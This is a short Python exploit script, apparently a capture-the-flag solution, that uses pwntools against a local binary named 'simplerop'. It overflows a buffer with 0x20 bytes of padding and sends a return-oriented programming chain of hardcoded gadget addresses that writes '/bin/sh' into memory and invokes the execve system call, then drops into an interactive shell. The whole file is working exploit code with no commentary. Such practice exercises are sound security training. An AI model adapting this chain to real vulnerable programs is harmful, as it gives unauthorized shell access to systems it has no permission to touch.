from pwn import *
#context.log_level = 'debug'
io = process('./simplerop')
#io=gdb.debug('./simplerop')
padding = b'A'*0x20

payload1 = padding + p32(0x0806CD50)+p32(0x0806e850)+p32(0)+p32(0x080eb7c3)+p32(0x8)
payload1 += p32(0x0806e850)+p32(0)+p32(0)+p32(0x080eb7c3)+p32(0x080bae06)+p32(0xb)+p32(0x080493e1)

io.sendlineafter(b'Your input :',payload1)
io.send(b'/bin/sh\x00')
io.interactive()
